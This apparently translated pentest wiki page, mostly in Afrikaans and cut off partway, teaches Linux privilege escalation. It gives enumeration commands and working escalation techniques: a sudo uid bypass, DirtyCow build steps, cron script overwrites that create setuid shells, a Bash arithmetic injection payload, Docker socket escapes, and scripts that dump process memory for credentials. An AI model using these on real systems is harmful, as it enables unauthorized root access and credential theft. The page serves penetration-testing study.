# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om meer te wete te kom oor die OS wat loop
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

As jy **skryfregtighede het op enige vouer binne die `PATH`** variabele, kan jy dalk sekere libraries of binaries hijack:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API keys in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel-weergawe en kyk of daar 'n exploit is wat gebruik kan word om privileges te escalate
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernelweergawes en 'n paar reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) en [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webtuistes waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernelweergawes vanaf daardie web te onttrek kan jy doen:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer op die slagoffer uit; kontroleer slegs exploits vir kernel 2.x)

Soek altyd **die kernel-weergawe op Google**, dalk is jou kernel-weergawe in 'n kernel exploit vermeld en dan sal jy seker wees dat hierdie exploit geldig is.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het gefaal

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln uitgebuit kan word
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Som moontlike verdedigingstegnieke

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer om daaruit te ontsnap:


{{#ref}}
docker-security/
{{#endref}}

## Drives

Kontroleer **wat gemonteer en ongemonteer is**, waar en waarom. As iets ongemonteer is, kan jy probeer om dit te monteer en kyk vir privaat inligting
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kyk ook of **any compiler is installed**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien waarop jy dit gaan gebruik (of op 'n soortgelyke) te compile.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kwetsbare sagteware geïnstalleer

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ou Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word vir escalating privileges…\
Dit word aanbeveel om handmatig die weergawe van die meer verdagte geïnstalleerde sagteware na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om verouderde en kwesbare sagteware wat op die masjien geïnstalleer is, na te gaan.

> [!NOTE] > _Neem asseblief kennis dat hierdie kommando's baie inligting sal vertoon wat meestal nutteloos sal wees; daarom word dit aanbeveel om toepassings soos OpenVAS of soortgelyke te gebruik wat sal nagaan of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Processes

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte het as wat dit behoort te hê** (dalk 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Kontroleer ook jou privileges oor die proses se binaries, dalk kan jy iemand oorskryf.

### Process monitoring

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes vervul is.

### Process memory

Sommige dienste op 'n bediener stoor **inlogbewyse in duidelike teks binne die geheue**.\
Normaalweg sal jy **root privileges** nodig hê om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit gewoonlik meer nuttig wanneer jy reeds root is en meer inlogbewyse wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle prosesse kan gedebug word, solank hulle dieselfde uid het. Dit is die klassieke wyse waarop ptrace gewerk het.
> - **kernel.yama.ptrace_scope = 1**: slegs 'n ouerproses kan gedebug word.
> - **kernel.yama.ptrace_scope = 2**: Slegs admin kan ptrace gebruik, aangesien dit die CAP_SYS_PTRACE capability vereis.
> - **kernel.yama.ptrace_scope = 3**: Geen prosesse mag met ptrace getraceer word nie. Sodra dit gestel is, is 'n herbegin nodig om ptrace weer moontlik te maak.

#### GDB

As jy toegang het tot die geheue van 'n FTP-diens (byvoorbeeld) kan jy die Heap kry en daarin soek na sy inlogbewyse.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skrip
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID, **maps wys hoe geheue binne daardie proses se** virtuele adresruimte gekarteer is; dit wys ook die **toegangsregte van elke gemapte gebied**. Die **mem** pseudo-lêer **maak die proses se geheue self sigbaar**. Uit die **maps** lêer weet ons watter **geheuegebiede leesbaar is** en hul offsets. Ons gebruik hierdie inligting om **in die mem-lêer te seek en alle leesbare gebiede na 'n lêer te dump**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan met /dev/kmem benader word.\

Tipies is `/dev/mem` slegs leesbaar deur **root** en die kmem-groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir linux

ProcDump is 'n Linux-herontwerp van die klassieke ProcDump-hulpmiddel uit die Sysinternals-suite vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om process memory te dump kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan manueel die root-vereistes verwyder en die proses wat aan jou behoort dump
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root is vereis)

### Inlogbewyse uit Process Memory

#### Handmatige voorbeeld

As jy vind dat die authenticator process aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die process dump (sien vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en soek na credentials in die memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **steal clear text credentials from memory** en vanaf sommige **well known files**. Dit vereis root privileges om behoorlik te werk.

| Funksie                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplande/Cron jobs

Kontroleer of enige geplande job kwesbaar is. Miskien kan jy voordeel trek uit 'n script wat deur root uitgevoer word (wildcard vuln? kan jy lêers wat root gebruik wysig? gebruik symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfregte oor /home/user het_)

As binne hierdie crontab die root user probeer om 'n opdrag of script uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur te gebruik:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” in 'n opdrag voorkom, kan jy dit uitbuit om onverwagte dinge te doen (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **nie).**

Lees die volgende bladsy vir meer wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) en let plaasvind. As 'n root cron/parser ontrusted log fields lees en dit in 'n arithmetic context ingestuur word, kan 'n attacker 'n command substitution $(...) injekteer wat as root uitgevoer word wanneer die cron loop.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **directory waar jy full access het** gebruik, kan dit dalk nuttig wees om daardie folder te verwyder en **create a symlink folder to another one** wat 'n script wat deur jou beheer word, bedien.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Gereelde cron jobs

Jy kan die prosesse monitor om prosesse te soek wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit uitbuit en escalate privileges.

Byvoorbeeld, om **monitor elke 0.1s gedurende 1 minuut**, **sorteer volgens die minste uitgevoerde kommando's** en verwyder die kommando's wat die meeste uitgevoer is, kan jy:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal elke proses wat begin monitor en lys).

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep deur 'n **carriage return na 'n kommentaar te plaas** (sonder newline character), en die cron job sal werk. Voorbeeld (let op die carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kontroleer of jy enige `.service` lêer kan skryf, as jy dit kan, kan jy dit **wysig** sodat dit jou **backdoor wanneer** die service **begin**, **herbegin** of **gestop** word (jy mag moontlik moet wag totdat die masjien herbegin).\
Byvoorbeeld skep jou backdoor binne die .service lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare service binaries

Hou in gedagte dat as jy **skryfregte oor binaries wat deur services uitgevoer word** het, jy hulle kan verander met backdoors sodat wanneer die services weer uitgevoer word die backdoors uitgevoer sal word.

### systemd PATH - Relatiewe paaie

Jy kan die deur **systemd** gebruikte PATH sien met:
```bash
systemctl show-environment
```
As jy ontdek dat jy in enige van die vouers van die pad kan **skryf**, mag jy in staat wees om **escalate privileges**. Jy moet soek na **relatiewe paaie wat in service-konfigurasielêers gebruik word** soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **executable** met dieselfde naam as die relatiewe pad binary binne die systemd PATH-gids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor** uitgevoer word (nie-geprivilegieerde gebruikers kan gewoonlik nie dienste begin/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd unit files waarvan die naam eindig op `**.timer**` wat `**.service**`-lêers of gebeure beheer. **Timers** kan as 'n alternatief vir cron gebruik word aangesien hulle ingeboude ondersteuning het vir kalender-tydgebeure en monotoniese tydgebeure en asinkroon uitgevoer kan word.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy sekere bestaande instansies van systemd.unit laat uitvoer (soos 'n `.service` of 'n `.target`).
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die unit wat geaktiveer word wanneer hierdie timer verstryk. Die argument is 'n unit-naam, waarvan die suffix nie ".timer" is nie. As dit nie gespesifiseer is nie, is hierdie waarde standaard 'n service wat dieselfde naam as die timer unit het, behalwe vir die suffix. (Sien hierbo.) Dit word aanbeveel dat die unit-naam wat geaktiveer word en die unit-naam van die timer unit identies genoem word, behalwe vir die suffix.

Daarom, om hierdie permissie te misbruik sal jy moet:

- Vind 'n systemd unit (soos 'n `.service`) wat 'n **skryfbare binary uitvoer**
- Vind 'n systemd unit wat 'n **relatiewe pad uitvoer** en jy het **skryfbevoegdhede** oor die **systemd PATH** (om daardie executable te imiteer)

**Learn more about timers with `man systemd.timer`.**

### **Timer inskakel**

Om 'n timer in te skakel benodig jy root privileges en jy moet die volgende uitvoer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Voorbeeld van uitbuiting:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let daarop dat daar dalk sommige **sockets listening for HTTP** requests is (_Ek praat nie oor .socket files nie, maar oor die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die socket **responds with an HTTP** request, kan jy daarmee **communicate** en dalk **exploit some vulnerability**.

### Skryfbare Docker Socket

Die Docker socket, dikwels gevind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. By verstek is dit skryfbaar deur die `root` gebruiker en lede van die `docker` groep. Om skryftoegang tot hierdie socket te hê, kan tot privilege escalation lei. Hier is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

Indien jy skryftoegang tot die Docker socket het, kan jy escalate privileges deur die volgende commands te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Gebruik van Docker API direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket steeds manipuleer word deur die Docker API en `curl`-opdragte.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die gasheer se root-direktorie mount.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n verbinding met die container te vestig, wat dit moontlik maak om opdragte binne die container uit te voer.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nadat die `socat`-verbinding gevestig is, kan jy opdragte direk in die container uitvoer met root-level toegang tot die gasheer se lêerstelsel.

### Ander

Let wel dat as jy skryfregte oor die docker socket het omdat jy **inside the group `docker`** is jy [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). As die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Kyk na **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

As jy vind dat jy die **`ctr`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

As jy vind dat jy die **`runc`** opdrag kan gebruik, lees die volgende bladsy aangesien **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus is 'n gesofistikeerde inter-proses kommunikasie (IPC) stelsel wat toepassings in staat stel om doeltreffend te kommunikeer en data te deel. Dit is ontwerp met die moderne Linux-stelsel in gedagte en bied 'n robuuste raamwerk vir verskillende vorme van toepassingskommunikasie.

Die stelsel is veelsydig: dit ondersteun basiese IPC wat data-uitruiling tussen prosesse verbeter, soortgelyk aan verbeterde UNIX domain sockets. Verder help dit om gebeure of seine uit te saai, wat naatlose integrasie tussen stelselkomponente bevorder. Byvoorbeeld, 'n sein van 'n Bluetooth-daemon oor 'n inkomende oproep kan 'n musiekspeler laat demp om die gebruikerservaring te verbeter. Daarbenewens ondersteun D-Bus 'n remote object-stelsel wat diensversoeke en metode-invoerings tussen toepassings vereenvoudig, wat prosesse wat tradisioneel kompleks was, stroomlyn.

D-Bus werk op 'n allow/deny-model en bestuur boodskappermissies (metode-oproepe, seinuitsendings, ens.) gebaseer op die kumulatiewe effek van ooreenstemmende beleidsreëls. Hierdie beleide spesifiseer interaksies met die bus en kan moontlik tot privilege escalation lei deur die uitbuiting van hierdie permissies.

'n Voorbeeld van so 'n beleid in /etc/dbus-1/system.d/wpa_supplicant.conf word verskaf, wat permissies uiteensit vir die root-gebruiker om met `fi.w1.wpa_supplicant1` eigenaar te wees, na te stuur en boodskappe daarvan te ontvang.

Beleide sonder 'n gespesifiseerde gebruiker of groep is universeel van toepassing, terwyl "default" konteksbeleide van toepassing is op almal wat nie deur ander spesifieke beleide gedek word nie.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Leer hoe om enumerate en exploit ’n D-Bus communication hier:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netwerk**

Dit is altyd interessant om die netwerk te enumerate en die posisie van die masjien vas te stel.

### Generiese enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Kontroleer altyd netwerkdienste wat op die masjien loop en wat jy voor toegang nie kon benader nie:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Kyk of jy traffic kan sniff. As jy dit kan, kan jy dalk 'n paar credentials kry.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Kontroleer **wie** jy is, watter **privileges** jy het, watter **users** in die stelsels is, watter van hulle kan **login** en watter het **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Groot UID

Sommige Linux-weergawes is deur 'n fout geraak wat gebruikers met **UID > INT_MAX** toelaat om voorregte te eskaleer. Meer inligting: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Benut dit** met: **`systemd-run -t /bin/bash`**

### Groepe

Kontroleer of jy 'n **lid van 'n groep** is wat jou root-voorregte kan gee:


{{#ref}}
